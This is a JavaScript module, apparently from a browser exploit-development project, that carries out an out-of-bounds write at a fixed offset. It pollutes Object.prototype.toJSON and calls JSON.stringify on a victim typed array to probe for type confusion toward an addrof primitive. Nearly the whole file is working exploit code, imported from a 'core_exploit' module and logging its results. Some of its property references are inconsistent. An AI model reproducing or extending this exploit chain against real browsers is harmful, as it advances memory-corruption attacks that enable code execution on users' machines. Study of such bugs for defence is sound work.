// js/script3/testArrayBufferVictimCrash.mjs (v30_FixCircularLog_Primitives)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP = "OriginalHeisenbug_TypedArrayAddrof_v30_FixCircularLog";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

// object_to_leak_A/B não são usados diretamente neste teste de logging
let victim_typed_array_ref_v30 = null; 
let probe_call_count_v30 = 0;
let last_probe_details_v30 = null; // Objeto global para detalhes da última sonda
const PROBE_CALL_LIMIT_V30 = 5; 


function toJSON_TA_Probe_FixCircularLog() {
    probe_call_count_v30++;
    const call_num = probe_call_count_v30;
    // current_call_details é local para esta chamada da sonda e se tornará o 'this' confuso
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v30_FixCircularLog",
        this_type: Object.prototype.toString.call(this), // Tipo do 'this' fornecido por JSON.stringify
        is_this_victim_array: (this === victim_typed_array_ref_v30),
        is_this_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_id_v30') && this.marker_id_v30 === `MARKER_CALL_${call_num - 1}`),
        confused_this_received_primitives: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.is_this_victim_array}. IsPrevMarker? ${current_call_details.is_this_prev_marker}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V30) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit. Returning stop object.`, "warn");
            // Mesmo no limite, atualizamos last_probe_details_v30 com o estado desta chamada final
            last_probe_details_v30 = current_call_details; 
            return { recursion_stopped_v30: true, call: call_num };
        }

        // A type confusion acontece quando 'this' (o current_call_details da chamada anterior, se is_this_prev_marker for true)
        // ou um objeto genérico (se is_this_prev_marker for false) é tratado como [object Object]
        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.is_this_victim_array}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
            
            // Atribuir apenas primitivas ao 'this' confuso (que é o current_call_details desta chamada)
            // para evitar erro de estrutura circular ao logar.
            this.confused_marker_property = true;
            this.some_number_property = 12345;
            this.another_string_prop = "test_string";
            current_call_details.confused_this_received_primitives = true; // Indica que 'this' (current_call_details) foi modificado
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Primitives written to confused 'this'. Keys: ${Object.keys(this).join(',')}`, "info");
            
            last_probe_details_v30 = this; // 'this' é o current_call_details modificado
            return this; // Retornar o 'this' confuso e modificado (que é current_call_details)
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    last_probe_details_v30 = current_call_details; // Garante que é atualizado
    return { marker_id_v30: `MARKER_CALL_${call_num}` }; 
}

export async function executeTypedArrayVictimAddrofTest_FixCircularLog() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (FixCircularLog) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP} Init...`;

    probe_call_count_v30 = 0;
    last_probe_details_v30 = null; 
    victim_typed_array_ref_v30 = null; 
    // object_to_leak_A/B não são usados diretamente neste teste

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let captured_last_probe_details_final = null;
    
    const fillPattern = 0.30303030303030;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v30 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        // Preenchimento do buffer não é crítico para este teste de logging, mas mantido por consistência
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v30.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v30 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixCircularLog, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v30); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Faz uma cópia profunda da variável global 'last_probe_details_v30'
            // que foi definida pela ÚLTIMA chamada da sonda.
            if (last_probe_details_v30) { 
                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v30)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global 'last_probe_details_v30'): ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_type === "[object Object]") {
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on 'this' of a probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"} by captured details. Last relevant 'this' type: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
            if(heisenbugConfirmed) {
                 logS3(`    CONFIRMED Confused 'this' details: Call #${captured_last_probe_details_final.call_number}, IsVictim? ${captured_last_probe_details_final.is_this_victim}, IsPrevMarker? ${captured_last_probe_details_final.is_this_prev_marker}, PrimitivesWritten? ${captured_last_probe_details_final.confused_this_received_primitives}`, "info");
            }
                
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}: ${heisenbugConfirmed ? "TC Log OK" : "TC Log Fail"}`;
            if (captured_last_probe_details_final && captured_last_probe_details_final.recursion_stopped_v30) {
                 document.title += " (Probe Limit)";
            }


        } catch (e_str) {
            errorCapturedMain = e_str; // Captura o TypeError aqui
            logS3(`    CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V30_FCLP} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v30}`, "info", FNAME_CURRENT_TEST);
        // Addrof results não são o foco deste teste.
        
        victim_typed_array_ref_v30 = null; 
        last_probe_details_v30 = null;
        probe_call_count_v30 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v30 // Este será 0 devido ao reset, mas o log acima mostra o valor correto.
    };
}
